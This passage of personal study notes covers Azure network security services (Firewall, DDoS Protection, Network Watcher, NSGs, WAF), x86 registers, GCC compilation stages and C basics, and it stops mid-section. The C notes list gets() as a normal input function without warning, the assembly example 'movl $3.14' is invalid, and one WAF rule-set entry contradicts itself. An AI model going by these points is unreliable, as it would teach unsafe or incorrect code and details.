<p><a href="clouds/azure/az700/images/az-firewall.png"></a></p>
<h2 id="introduction-25"><a class="header" href="#introduction-25">Introduction</a></h2>
<ul>
<li>Azure Firewall is a managed, cloud-based network security service that protects your Azure Virtual Network resources. It‚Äôs a fully stateful firewall as a service with built-in high availability and unrestricted cloud scalability. It can be used to scan inbound and outbound traffic.</li>
<li>Azure Firewall requires it‚Äôs own subnet. The name needs to be <code>AzureFirewallSubnet</code>.</li>
<li>Force Tunneling requires that a subnet named <code>AzureFirewallManagementSubnet</code> be created. This subnet is used for Azure Firewall management traffic.</li>
</ul>
<h2 id="azure-firewall-features"><a class="header" href="#azure-firewall-features">Azure Firewall Features</a></h2>
<ul>
<li>Built-in high availability</li>
<li>Unrestricted cloud scalability</li>
<li>Application FQDN Filtering rules</li>
<li>FQDN Tags - tags make it easy for you to allow well-known Azure Service network traffic through your firewall.</li>
<li>Service Tags - A service tag represents a group of IP address prefixes to help minimize security rule complexity. Microsoft manages these. You cannot create your own service tags or modify existing service tags.</li>
<li>Threat Intelligence - IDS/IPS</li>
<li>TLS Inspection - decrypt outbound traffic, process the data, and then re-encrypt it before sending it to it‚Äôs destination</li>
<li>Outbound SNAT support</li>
<li>Inbound DNAT support</li>
<li>Forced Tunneling</li>
</ul>
<h2 id="rule-processing"><a class="header" href="#rule-processing">Rule Processing</a></h2>
<h3 id="classic-rules"><a class="header" href="#classic-rules">Classic Rules</a></h3>
<ul>
<li>You can create NAT rules, network rules, and application rules, and this can all be done using classic rules or Firewall Policy</li>
<li>Azure Firewall denies all traffic by default. You must create rules to allow traffic.</li>
<li>With classic rules, rule collections are processed according to the rule type in priority order. Lower to higher numbers from 100 (highest priority) to 65000 (lowest priority).</li>
</ul>
<h3 id="firewall-policy"><a class="header" href="#firewall-policy">Firewall Policy</a></h3>
<ul>
<li>Configuring a single Azure Firewall can be complex due to multiple rule collections, including:
<ul>
<li>Network Address Translation (NAT) rules</li>
<li>Network rules</li>
<li>Application rules</li>
</ul>
</li>
<li>Additional complexities include custom DNS settings, threat intelligence rules, and the need for different rules for different groups (e.g., developers, database users, marketing).</li>
<li><strong>Firewall Policy</strong>:
<ul>
<li>An Azure resource that contains collections of NAT, network, and application rules.</li>
<li>Also includes custom DNS settings, threat intelligence settings, and more.</li>
<li>Can be applied to multiple firewalls via Azure Firewall Manager.</li>
<li>Supports hierarchical policies, where a base policy can be inherited by specialized policies.</li>
</ul>
</li>
<li>With Firewall Policy, rules are organized in rule collections which are contained in rule collection groups. Rule collections can be of the following types:
<ul>
<li>DNAT</li>
<li>Network</li>
<li>Application</li>
</ul>
</li>
<li>You can define multiple rule collection types in a rule collection group. But all of the rules in a rule collection must be of the same type.</li>
<li>Rule collections are processed in the following order:
<ul>
<li>DNAT</li>
<li>Network</li>
<li>Application</li>
</ul>
</li>
</ul>
<h2 id="availability-zones"><a class="header" href="#availability-zones">Availability Zones</a></h2>
<ul>
<li>Azure Firewall supports Availability Zones. When you create an Azure Firewall, you can choose to deploy it in a single zone or across all zones.</li>
<li>SLAs:
<ul>
<li>Single Zone: 99.95%</li>
<li>Multiple Zones: 99.99%</li>
</ul>
</li>
</ul>
<h2 id="azure-firewall-service-tiers"><a class="header" href="#azure-firewall-service-tiers">Azure Firewall Service Tiers</a></h2>
<ul>
<li>Azure Firewall is available in three service tiers: Basic, Standard, and Premium.
<ul>
<li><strong>Basic</strong>: Designed for small and medium-sized businesses.
<ul>
<li>Provides basic network traffic protection at an affordable cost.</li>
</ul>
</li>
<li><strong>Standard</strong>: Designed for organizations that require basic network security with high scalability at a moderate price.</li>
<li><strong>Premium</strong>: Designed for organizations in highly regulated industries that handle sensitive information and require a higher level of network security.
<ul>
<li>Able to encrypt/decrypt network traffic for TLS inspection</li>
<li>IDS/IPS capabilities</li>
<li>Supports path based URL filtering
<ul>
<li>Standard supports URL filtering, but you cannot filter based on the path of the URL.</li>
</ul>
</li>
<li>Web Categories
<ul>
<li>Allow or deny traffic to and from websites based on categories (gambling, social media, pornography, etc.)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="azure-firewall-capabilities"><a class="header" href="#azure-firewall-capabilities">Azure Firewall Capabilities</a></h2>
<ul>
<li>Network Filtering
<ul>
<li>Can filter traffic based on the five tuples of the source IP address, destination IP address, source port, destination port, and protocol.
<ul>
<li>You can filter based on user-defined groups of IP addresses of Azure Service Tags.</li>
</ul>
</li>
</ul>
</li>
<li>FQDN Filtering
<ul>
<li>A simple URL filter without TLS termination or packet inspection.</li>
<li>FQDN Filtering can be enabled at the network level or the application level. If configured at the application layer, it uses information in the HTTP headers to allow or block outgoing web traffic or Azure SQL traffic.</li>
<li>Can be bypassed by initiating requests using IP addresses.</li>
<li>To simplify applying rules to multiple FQDNs, you can use FQDN Tags. For example, if you wanted to filter Windows Update FQDNs, rather than manually maintaining a list of all the Windows Update FQDNs, you could simply use the Windows Update FQDN Tag.</li>
</ul>
</li>
<li>URL Filtering
<ul>
<li>Expands on FQDN filtering to evaluate the entire URL path, rather than just domain names.</li>
<li>This feature is only available with the Premium SKU.</li>
</ul>
</li>
<li>Web Categorization Filtering
<ul>
<li>Can be used to allow or block outgoing web traffic based on the category of the website. For example, you could block all social media websites.</li>
<li>Both Standard and Premium SKUs support this feature, with the Premium SKU supporting more accurate categorization.</li>
</ul>
</li>
<li>Threat Intelligence-based Filtering
<ul>
<li>Azure Firewall can use threat intelligence feeds to block known malicious IP addresses and domains.</li>
<li>Enabled in Alert Mode by default. But can be configured in Alert and Deny mode or even Disabled.</li>
<li>Supported by both Premium and Standard SKUs.</li>
</ul>
</li>
</ul>
<h2 id="azure-firewall-manager"><a class="header" href="#azure-firewall-manager">Azure Firewall Manager</a></h2>
<ul>
<li><strong>Azure Firewall Manager</strong> provides a central point for configuration and management of multiple Azure Firewall instances.</li>
<li>Enables the creation of one or more firewall policies that can be rapidly applied to multiple firewalls.</li>
</ul>
<h3 id="key-features-of-azure-firewall-manager"><a class="header" href="#key-features-of-azure-firewall-manager">Key Features of Azure Firewall Manager</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Centralized management</td><td>Manage all firewall configurations across your network.</td></tr>
<tr><td>Manage multiple firewalls</td><td>Deploy, configure, and monitor multiple firewalls from a single interface.</td></tr>
<tr><td>Supports multiple network architectures</td><td>Protects standard Azure virtual networks and Azure Virtual WAN Hubs.</td></tr>
<tr><td>Automated traffic routing</td><td>Network traffic is automatically routed to the firewall (when used with Azure Virtual WAN Hub).</td></tr>
<tr><td>Hierarchical policies</td><td>Create parent and child firewall policies; child policies inherit rules/settings from parent.</td></tr>
<tr><td>Support for third-party security providers</td><td>Integrate third-party SECaaS solutions to protect your network‚Äôs internet connection.</td></tr>
<tr><td>DDoS protection plan</td><td>Associate virtual networks with a DDoS protection plan within Azure Firewall Manager.</td></tr>
<tr><td>Manage Web Application Firewall policies</td><td>Centrally create and associate Web Application Firewall (WAF) policies for platforms like Azure Front Door and Azure Application Gateway.</td></tr>
</tbody>
</table>
</div>
<blockquote>
<p><strong>Note</strong>: Azure Firewall Manager allows integration with third-party SECaaS solutions, enabling Azure Firewall to monitor local traffic while the third-party provider monitors internet traffic.</p>
</blockquote>
<h3 id="architecture-options"><a class="header" href="#architecture-options">Architecture Options</a></h3>
<ul>
<li><strong>Hub virtual network</strong>: A standard Azure virtual network where one or more firewall policies are applied.</li>
<li><strong>Secured virtual hub</strong>: An Azure Virtual WAN Hub where one or more firewall policies are applied.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ddos-protection"><a class="header" href="#ddos-protection">DDoS Protection</a></h1>
<h2 id="overview-7"><a class="header" href="#overview-7">Overview</a></h2>
<p>A distributed denial of service attack occurs when an attacker overwhelms a target with a flood of traffic, rendering the target unable to respond to legitimate requests. DDoS attacks can be difficult to mitigate because the attacker can use many different IP addresses to send traffic to the target. This makes it difficult to block the attacker‚Äôs traffic without also blocking legitimate traffic.</p>
<h2 id="types-of-ddos-attacks"><a class="header" href="#types-of-ddos-attacks">Types of DDoS Attacks</a></h2>
<ul>
<li><strong>Volumetric Attacks</strong>: These attacks flood the target with a large amount of traffic, overwhelming the target‚Äôs network capacity.</li>
<li><strong>Protocol Attacks</strong>: These attacks exploit vulnerabilities in network protocols to consume the target‚Äôs resources.</li>
<li><strong>Application Layer Attacks</strong>: These attacks target the application layer of the target, consuming resources such as CPU and memory.</li>
</ul>
<p>Azure DDoS Protection provides protection against volumetric and protocol attacks. To protect against application layer attacks, you can use a Web Application Firewall (WAF).</p>
<h2 id="azure-ddos-protection"><a class="header" href="#azure-ddos-protection">Azure DDoS Protection</a></h2>
<ul>
<li>Service Tiers
<ul>
<li><strong>IP Protection</strong>: This tier offers a pricing model in which you pay per protected public IP address.</li>
<li><strong>Network Protection</strong>: This tiers offers protection for an entire virtual network and all public IP addresses that are associated with resources in the vNet.
<ul>
<li>DDoS Network Protection provides additional features that are not available with the IP Protection:
<ul>
<li>DDoS Rapid Response Support - Gives you access to a team of DDoS response specialists who can help you mitigate an attack.</li>
<li>Cost Protection - Provides Azure credits back to us if a successful DDoS attack results in extra costs due to infrastructure scale out.</li>
<li>WAF Discount - Offers a pricing discount for Azure WAF</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="network-watcher"><a class="header" href="#network-watcher">Network Watcher</a></h1>
<h2 id="introduction-26"><a class="header" href="#introduction-26">Introduction</a></h2>
<p>Network Watcher is a collection of tools used to monitor and diagnose network connectivity in Azure. It focuses on monitoring the network health of IaaS services in Azure. Network Watcher is not suitable for monitoring PaaS services or performing web analytics. The tools in Network Watcher fall into two main categories - network monitoring and network diagnostics.</p>
<p>Network Monitor is a regional service which means we must create a Network Watcher in each region we want to monitor. Network Watcher is not enabled by default and must be enabled in each region we want to monitor.</p>
<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
<h3 id="network-monitoring-tools"><a class="header" href="#network-monitoring-tools">Network Monitoring Tools</a></h3>
<ul>
<li><a href="#topology">Topology</a></li>
<li><a href="#connection-monitor">Connection Monitor</a></li>
</ul>
<h2 id="topology"><a class="header" href="#topology">Topology</a></h2>
<ul>
<li>The Topology tool provides a visual representation of the network resources in a subscription. The tool shows the resources in a subscription and the connections between them. The Topology tool can be used to understand the network architecture of a subscription, identify network security groups, and troubleshoot network connectivity issues.</li>
<li>The only requirements is to have a Network Watcher resource enabled in the same region as the vNet for which you want to create a topology map.</li>
<li>There is no additional cost for using the Topology Map.</li>
</ul>
<h2 id="connection-monitor"><a class="header" href="#connection-monitor">Connection Monitor</a></h2>
<ul>
<li>Continuously monitor the connection between two endpoints.</li>
<li>Connection Monitor relies on agents that are installed on source endpoints to perform connectivity tests and collect data related to connection health. The agent simulates network traffic between source and destination to measure key metrics, such as latency.</li>
<li>The agent to install on the source endpoint depends on whether the source VM is running in Azure or on-premises. For Azure VMs, we can install the Network Watcher extension. For on-prem VMs, we can install the Azure Monitor Agent (AMA).</li>
<li>Stores results in Log Analytics</li>
<li>Connectivity checks can use HTTP, TCP, or ICMP</li>
</ul>
<h3 id="network-diagnostics-tools"><a class="header" href="#network-diagnostics-tools">Network Diagnostics Tools</a></h3>
<h2 id="ip-flow-verify"><a class="header" href="#ip-flow-verify">IP Flow Verify</a></h2>
<ul>
<li>Network Watcher IP flow verify checks if a packet is allowed or denied from a virtual machine based on 5-tuple information. The security group decision and the name of the rule that denied the packet will be returned</li>
</ul>
<h2 id="next-hop"><a class="header" href="#next-hop">Next Hop</a></h2>
<ul>
<li>Next Hop provides the next hop from the target virtual machine to the destination IP address.
<img src="clouds/azure/az700/images/network-watcher-next-hop.png" alt=""></li>
</ul>
<h2 id="connection-troubleshoot"><a class="header" href="#connection-troubleshoot">Connection Troubleshoot</a></h2>
<ul>
<li>Available from the <code>Network Watcher</code> blade or from the Virtual <code>Machine</code> blade</li>
<li>Similar to Connection Monitor, but allows you to monitor the connection between a VM and a destination IP address on-demand, rather than continuously</li>
<li>Can be used to check if a port is open at a destination</li>
<li>Only supports ICMP and TCP</li>
<li>If the endpoint to test is an Azure VM or VMSS instance, you need to install the Network Watcher extension.</li>
</ul>
<h3 id="componenents"><a class="header" href="#componenents">Componenents</a></h3>
<ul>
<li>Source Types:
<ul>
<li>VM / VMSS</li>
<li>App Gateway</li>
<li>Bastion Host</li>
</ul>
</li>
<li>Destionation Types:
<ul>
<li>Virtual Machine</li>
<li>IP Address</li>
</ul>
</li>
<li>You can choose to use IPv4 or IPv6, or both</li>
<li>You then specify the source and destination ports</li>
<li>You can also specify the protocol to use (TCP or ICMP</li>
<li>Finally, you choose the type of Diagnostic Test to run:
<ul>
<li>Connectivity Test</li>
<li>Next Hop</li>
<li>NSG Diagnostic</li>
<li>Port Scanner</li>
</ul>
</li>
</ul>
<h2 id="nsg-diagnostics"><a class="header" href="#nsg-diagnostics">NSG Diagnostics</a></h2>
<ul>
<li>The Network Security Group Diagnostics tool provides detailed information to understand and debug the security configuration of your network. For a given source-destination pair, network security group diagnostics returns all network security groups that will be traversed, the rules that will be applied in each network security group, and the final allow/deny status for the flow.</li>
<li>The tool can be used to troubleshoot connectivity issues, understand the rules that are applied to a flow, and verify that the rules are correct.</li>
</ul>
<h2 id="nsg-flow-logs"><a class="header" href="#nsg-flow-logs">NSG Flow Logs</a></h2>
<ul>
<li>NSG Flow Logs are a feature of Network Watcher that allows you to view information about ingress and egress IP traffic through a Network Security Group. The logs are stored in a storage account and can be viewed in the Azure portal or downloaded for further analysis.</li>
</ul>
<h2 id="packet-capture"><a class="header" href="#packet-capture">Packet Capture</a></h2>
<ul>
<li>Packet capture allows you to create packet capture sessions to track traffic to and from a virtual machine. You can create a packet capture session on a VM, VMSS, or network interface. The packet capture session will capture all network traffic to and from the virtual machine or network interface. You can then download the packet capture file and analyze it using a network protocol analyzer.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="network-security-groups"><a class="header" href="#network-security-groups">Network Security Groups</a></h1>
<h2 id="introduction-27"><a class="header" href="#introduction-27">Introduction</a></h2>
<ul>
<li>Network Security Groups are access control lists that are attached to a virtual machine‚Äôs vNic or a subnet</li>
<li>By default, there are no inbound allow rules added to a NSG</li>
<li>NSG rules are stateful, meaning that if you allow traffic in one direction, the return traffic is automatically allowed</li>
<li>When you have rules applied to both subnet and vNic, the rules are combined. Any allow rules at the subnet level must also be allowed at the vNic level</li>
</ul>
<h2 id="default-rules"><a class="header" href="#default-rules">Default Rules</a></h2>
<ul>
<li>
<p>There are 3 default inbound rules that are added to a NSG:</p>
<ul>
<li><strong>AllowVnetInBound</strong> - allow traffic within the vNet</li>
<li><strong>AllowAzureLoadBalancerInBound</strong> - allow traffic from Azure Load Balancer</li>
<li><strong>DenyAllInBound</strong> - deny all inbound traffic</li>
</ul>
</li>
<li>
<p>There are 3 default outbound rules that are added to a NSG:</p>
<ul>
<li><strong>AllowVnetOutBound</strong> - allow traffic within the vNet</li>
<li><strong>AllowInternetOutBound</strong> - allow traffic to the internet</li>
<li><strong>DenyAllOutBound</strong> - deny all outbound traffic</li>
</ul>
</li>
</ul>
<h2 id="rule-priority"><a class="header" href="#rule-priority">Rule Priority</a></h2>
<ul>
<li>Rules are evaluated in priority order</li>
<li>The lower the number, the higher the priority</li>
<li>The default rules have a priority of 65,000</li>
</ul>
<h2 id="rule-types"><a class="header" href="#rule-types">Rule Types</a></h2>
<ul>
<li>There are 2 types of rules:
<ul>
<li><strong>Default Rules</strong> - cannot be deleted</li>
<li><strong>Custom Rules</strong> - can be added, modified, or deleted</li>
</ul>
</li>
</ul>
<h2 id="rule-properties"><a class="header" href="#rule-properties">Rule Properties</a></h2>
<ul>
<li><strong>Name</strong> - name of the rule</li>
<li><strong>Priority</strong> - determines the order in which rules are applied</li>
<li><strong>Source/Destination</strong> - can be an IP address, CIDR block, service tag, or application security group</li>
<li><strong>Protocol</strong> - TCP, UDP, or Any</li>
<li><strong>Port Range</strong> - single port, range of ports, or * for all ports</li>
<li><strong>Action</strong> - Allow or Deny</li>
<li><strong>Direction</strong> - Inbound or Outbound</li>
</ul>
<h2 id="source-types"><a class="header" href="#source-types">Source Types</a></h2>
<ul>
<li><strong>IP Address</strong> - single IP address</li>
<li><strong>CIDR Block</strong> - range of IP addresses</li>
<li><strong>Service Tag</strong> - predefined tag for Azure services</li>
<li><strong>Application Security Group</strong> - group of VMs that can be used as a source or destination</li>
</ul>
<h2 id="service-tags"><a class="header" href="#service-tags">Service Tags</a></h2>
<ul>
<li><strong>Internet</strong> - all IP addresses</li>
<li><strong>VirtualNetwork</strong> - all IP addresses in the vNet</li>
<li><strong>AzureLoadBalancer</strong> - all IP addresses of Azure Load Balancer</li>
<li><strong>AzureTrafficManager</strong> - all IP addresses of Azure Traffic Manager</li>
<li><strong>GatewayManager</strong> - all IP addresses of VPN Gateway</li>
<li><strong>AzureMonitor</strong> - all IP addresses of Azure Monitor</li>
<li><strong>Storage</strong> - all IP addresses of Azure Storage</li>
<li><strong>SQL</strong> - all IP addresses of Azure SQL</li>
<li><strong>AppService</strong> - all IP addresses of Azure App Service</li>
<li><strong>ContainerRegistry</strong> - all IP addresses of Azure Container Registry</li>
<li><strong>KeyVault</strong> - all IP addresses of Azure Key Vault</li>
<li><strong>AzureBackup</strong> - all IP addresses of Azure Backup</li>
<li><strong>AzureDNS</strong> - all IP addresses of Azure DNS</li>
<li><strong>LogAnalytics</strong> - all IP addresses of Azure Log Analytics</li>
<li><strong>EventHub</strong> - all IP addresses of Azure Event Hub</li>
<li><strong>ServiceBus</strong> - all IP addresses of Azure Service Bus</li>
<li><strong>AzureCosmosDB</strong> - all IP addresses of Azure Cosmos DB</li>
<li><strong>AzureContainerInstance</strong> - all IP addresses of Azure Container Instance</li>
<li>etc‚Ä¶.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="web-application-firewall"><a class="header" href="#web-application-firewall">Web Application Firewall</a></h1>
<h2 id="introduction-28"><a class="header" href="#introduction-28">Introduction</a></h2>
<ul>
<li>Azure has a web application firewall integrated with two services: Azure Front Door and Azure Application Gateway.</li>
<li>A WAF is a security feature that protects web applications from common web vulnerabilities.</li>
</ul>
<h2 id="rule-sets-1"><a class="header" href="#rule-sets-1">Rule Sets</a></h2>
<ul>
<li><strong>OWASP Core Rule Set (CRS)</strong>:
<ul>
<li>Can only be applied to Application Gateway WAF and not Front Door WAF</li>
</ul>
</li>
<li><strong>Microsoft Rule Set</strong>:
<ul>
<li>Can be applied to both Application Gateway WAF and Front Door WAF</li>
<li>Contains rules authored by the Microsoft Threat Intelligence Team, in addition to the OWASP CRS rules</li>
<li>Can only be applied to the Azure Front Door Premium SKU</li>
</ul>
</li>
<li><strong>Microsoft Bot Manager Rule Set</strong>:
<ul>
<li>Can be applied to both Application Gateway WAF and Front Door Premium (not Standard) WAF</li>
<li>Contains rules to protect against bot traffic, authored by the Microsoft Threat Intelligence Team</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="assembly"><a class="header" href="#assembly">Assembly</a></h1>
<h2 id="table-of-contents-5"><a class="header" href="#table-of-contents-5">Table of Contents</a></h2>
<ul>
<li><a href="#syntaxes">Syntaxes</a>
<ul>
<li><a href="#intel">Intel</a></li>
<li><a href="#att">AT&amp;T</a></li>
</ul>
</li>
<li><a href="#registers">Registers</a>
<ul>
<li><a href="#general-purpose-registers">general-purpose Registers</a></li>
</ul>
</li>
</ul>
<h1 id="syntaxes"><a class="header" href="#syntaxes">Syntaxes</a></h1>
<ul>
<li>There are 2 types of assembly language syntax in common use:</li>
</ul>
<h2 id="intel"><a class="header" href="#intel">Intel</a></h2>
<h2 id="att"><a class="header" href="#att">ATT</a></h2>
<h1 id="registers"><a class="header" href="#registers">Registers</a></h1>
<ul>
<li>Registers are small, fast storage areas on the CPU</li>
<li>In IA-32 architecture, there are 10 32-bit registers and 6 16-bit registers</li>
<li>Registers are grouped into 3 categories: general-purpose, control, and segment
<ul>
<li>general-purpose is further grouped into data, index, and pointer</li>
</ul>
</li>
</ul>
<h2 id="general-purpose-registers"><a class="header" href="#general-purpose-registers">General-Purpose Registers</a></h2>
<h3 id="data-registers"><a class="header" href="#data-registers">Data Registers</a></h3>
<pre><code>  %eax: Accumulator, often used for arithmetic and return values.
  %ebx: Base register, used for extra storage.
  %ecx: Counter, often used in loops.
  %edx: Data register, often used for I/O operations.
</code></pre>
<h3 id="index-registers"><a class="header" href="#index-registers">Index registers</a></h3>
<pre><code>  %esi/%edi: Source and destination for data operations.
</code></pre>
<h3 id="pointer-registers"><a class="header" href="#pointer-registers">Pointer Registers</a></h3>
<pre><code>    %eip: stores the offset address of the next instruction to be executed. 
    %esp: Stack Pointer, points to the top of the stack.
    %ebp: Base Pointer, used for stack frame management.
</code></pre>
<h2 id="control-registers"><a class="header" href="#control-registers">Control Registers</a></h2>
<h2 id="segment-registers"><a class="header" href="#segment-registers">Segment Registers</a></h2>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="the-4-steps-of-compilation-with-gcc"><a class="header" href="#the-4-steps-of-compilation-with-gcc">The 4 Steps of Compilation with GCC</a></h1>
<p>GCC transforms source code into an executable file through four primary steps:</p>
<hr>
<h2 id="1-preprocessing"><a class="header" href="#1-preprocessing"><strong>1. Preprocessing</strong></a></h2>
<ul>
<li><strong>What happens</strong>:
<ul>
<li>The preprocessor handles directives in the source code (e.g., <code>#include</code>, <code>#define</code>, <code>#ifdef</code>).</li>
<li>It replaces macros, includes header files, and resolves conditional compilation directives.</li>
</ul>
</li>
<li><strong>Input</strong>: <code>.c</code> source file.</li>
<li><strong>Output</strong>: A preprocessed source file (usually with a <code>.i</code> or <code>.ii</code> extension).</li>
<li><strong>Command</strong>:
<pre><code class="language-bash">gcc -E file.c -o file.i
</code></pre>
</li>
<li><strong>Example</strong>:
<ul>
<li>Converts:
<pre><code class="language-c">#include &lt;stdio.h&gt;
#define PI 3.14
printf("PI is %f\n", PI);
</code></pre>
Into:
<pre><code class="language-c">// Expanded header contents of stdio.h
printf("PI is %f\n", 3.14);
</code></pre>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="2-compilation"><a class="header" href="#2-compilation"><strong>2. Compilation</strong></a></h2>
<ul>
<li><strong>What happens</strong>:
<ul>
<li>The compiler translates the preprocessed source code into assembly language, specific to the target architecture.</li>
</ul>
</li>
<li><strong>Input</strong>: Preprocessed source file (<code>.i</code> or <code>.ii</code>).</li>
<li><strong>Output</strong>: Assembly file (usually with a <code>.s</code> extension).</li>
<li><strong>Command</strong>:
<pre><code class="language-bash">gcc -S file.i -o file.s
</code></pre>
</li>
<li><strong>Example</strong>:
<ul>
<li>Converts preprocessed code into assembly instructions like:
<pre><code class="language-asm">movl $3.14, -4(%ebp)
call printf
</code></pre>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="3-assembly"><a class="header" href="#3-assembly"><strong>3. Assembly</strong></a></h2>
<ul>
<li><strong>What happens</strong>:
<ul>
<li>The assembler translates the assembly code into machine code, creating an object file.</li>
</ul>
</li>
<li><strong>Input</strong>: Assembly file (<code>.s</code>).</li>
<li><strong>Output</strong>: Object file (<code>.o</code> or <code>.obj</code>).</li>
<li><strong>Command</strong>:
<pre><code class="language-bash">gcc -c file.s -o file.o
</code></pre>
</li>
<li><strong>Example</strong>:
<ul>
<li>Produces a binary object file containing machine instructions that the CPU can execute.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="4-linking"><a class="header" href="#4-linking"><strong>4. Linking</strong></a></h2>
<ul>
<li><strong>What happens</strong>:
<ul>
<li>The linker combines object files and libraries to create an executable program.</li>
<li>Resolves symbols (e.g., function calls, global variables) across different object files.</li>
</ul>
</li>
<li><strong>Input</strong>: One or more object files (<code>.o</code>) and optional libraries.</li>
<li><strong>Output</strong>: Executable file (e.g., <code>a.out</code> by default).</li>
<li><strong>Command</strong>:
<pre><code class="language-bash">gcc file.o -o file
</code></pre>
</li>
<li><strong>Example</strong>:
<ul>
<li>Combines multiple <code>.o</code> files and links to the standard C library (<code>libc</code>) to produce a runnable executable.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="full-process-with-gcc"><a class="header" href="#full-process-with-gcc"><strong>Full Process with GCC</strong></a></h2>
<p>Running GCC without intermediate steps performs all four stages automatically:</p>
<pre><code class="language-bash">gcc file.c -o file
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="c-programming-notes"><a class="header" href="#c-programming-notes">C Programming Notes</a></h1>
<h2 id="overview-8"><a class="header" href="#overview-8">Overview</a></h2>
<ul>
<li>C is a general-purpose, procedural computer programming language supporting structured programming, lexical variable scope, and recursion, with a static type system.</li>
<li>Every C program has a <code>main()</code> function that is the entry point of the program.</li>
<li>C is a compiled language, meaning that the source code is compiled into machine code before it is executed.</li>
<li>C is a low-level language, meaning that it is closer to machine code than high-level languages like Python or JavaScript.</li>
<li>C does not support object-oriented programming</li>
<li>C is a statically typed language, meaning that the type of a variable must be declared before it is used.</li>
</ul>
<h2 id="comments"><a class="header" href="#comments">Comments</a></h2>
<ul>
<li>Single line comments are denoted by <code>//</code></li>
<li>Multi-line comments are denoted by <code>/* */</code></li>
</ul>
<h2 id="importing-libraries"><a class="header" href="#importing-libraries">Importing Libraries</a></h2>
<ul>
<li>Libraries are imported using the <code>#include</code> directive</li>
</ul>
<h2 id="variables-1"><a class="header" href="#variables-1">Variables</a></h2>
<ul>
<li>A variable scope is the region of code where a variable can be accessed.</li>
<li>In C, all variables must be declared before they are used.</li>
<li>Variables must be declared with a type and an optional initial value.</li>
<li>To declare a variable:</li>
</ul>
<pre><code>int x = 5;
unsigned int y = 10;

char c = 'a';

float f = 3.14;

double d = 3.14159;

int x[5] = {1, 2, 3, 4, 5};

struct Point {
    int x;
    int y;
};
</code></pre>
<h2 id="structs"><a class="header" href="#structs">Structs</a></h2>
<ul>
<li>A struct is a user-defined data type that groups related data together.</li>
<li>To declare a struct:</li>
</ul>
<pre><code>struct Point {
    int x;
    int y;
};
</code></pre>
<ul>
<li>To create an instance of a struct:</li>
</ul>
<pre><code>struct Point p;
p.x = 10;
p.y = 20;
</code></pre>
<ul>
<li>To create a pointer to a struct:</li>
</ul>
<pre><code>struct Point *ptr = &amp;p;
</code></pre>
<ul>
<li>To access a member of a struct using a pointer:</li>
</ul>
<pre><code>ptr-&gt;x = 30;
ptr-&gt;y = 40;
</code></pre>
<h2 id="strings"><a class="header" href="#strings">Strings</a></h2>
<ul>
<li>C does not support strings as a primitive type. Instead, strings are represented as arrays of characters. You can import the <code>string.h</code> library to use string functions.</li>
<li>To declare a string:</li>
</ul>
<pre><code>char str[10] = "Hello\0";
</code></pre>
<ul>
<li>In the example above, we declare a character array <code>str</code> with a size of 10. The string ‚ÄúHello‚Äù is stored in the array, and the null character <code>\0</code> is used to terminate the string. We use the null character because we cannot assume that the string is the same size as the array. Arrays may be larger than the string they contain.</li>
<li>C provides a string library with common functions for manipulating strings</li>
</ul>
<h2 id="data-types"><a class="header" href="#data-types">Data Types</a></h2>
<ul>
<li>Basic data types in C include:
<ul>
<li>int: integer</li>
<li>char: character</li>
<li>float: floating-point number</li>
<li>double: double-precision floating-point number</li>
<li>void: no value</li>
</ul>
</li>
<li>Modifiers can be used to modify the basic data types:
<ul>
<li>short: short integer</li>
<li>long: long integer</li>
<li>signed: signed integer</li>
<li>unsigned: unsigned integer</li>
</ul>
</li>
<li>The <code>sizeof()</code> function can be used to determine the size of a data type in bytes.</li>
<li>The <code>typedef</code> keyword can be used to create custom data types.</li>
<li>C does not include boolean types by default. Instead, 0 is considered false and any other value is considered true.</li>
</ul>
<h2 id="operators"><a class="header" href="#operators">Operators</a></h2>
<ul>
<li>Arithmetic operators: <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></li>
<li>Relational operators: <code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></li>
<li>Logical Operators: <code>&amp;&amp;</code>, <code>||</code>, <code>!</code></li>
<li>Bitwise Operators: <code>&amp;</code>, <code>|</code>, <code>^</code>, <code>~</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code></li>
</ul>
<h2 id="line-and-spacing-conventions"><a class="header" href="#line-and-spacing-conventions">Line and Spacing Conventions</a></h2>
<ul>
<li>C is not whitespace sensitive, but it is good practice to use whitespace to make code more readable.</li>
<li>Statements in C are terminated by a semicolon <code>;</code></li>
<li>Blocks of code are enclosed in curly braces <code>{}</code></li>
</ul>
<h2 id="input-and-output"><a class="header" href="#input-and-output">Input and Output</a></h2>
<ul>
<li>The <code>printf()</code> function is used to print output to the console.</li>
<li>The <code>scanf()</code> function is used to read input from the console.</li>
<li>The <code>getchar()</code> function is used to read a single character from the console.</li>
<li>The <code>putchar()</code> function is used to print a single character to the console.</li>
<li>The <code>gets()</code> function is used to read a string from the console.</li>
<li>The <code>puts()</code> function is used to print a string to the console.</li>
</ul>
<h2 id="conditionals-1"><a class="header" href="#conditionals-1">Conditionals</a></h2>
<ul>
<li>The <code>if</code> statement is used to execute a block of code if a condition is true.</li>
<li>The <code>else</code> statement is used to execute a block of code if the condition is false.</li>
<li>The <code>else if</code> statement is used to execute a block of code if the previous condition is false and the current condition is true.</li>
<li>Example:</li>
</ul>
<pre><code>int x = 10;
if (x &gt; 5) {
    printf("x is greater than 5\n");
} else if (x == 5) {
    printf("x is equal to 5\n");
} else {
    printf("x is less than 5\n");
}
</code></pre>
<h2 id="loops"><a class="header" href="#loops">Loops</a></h2>
<ul>
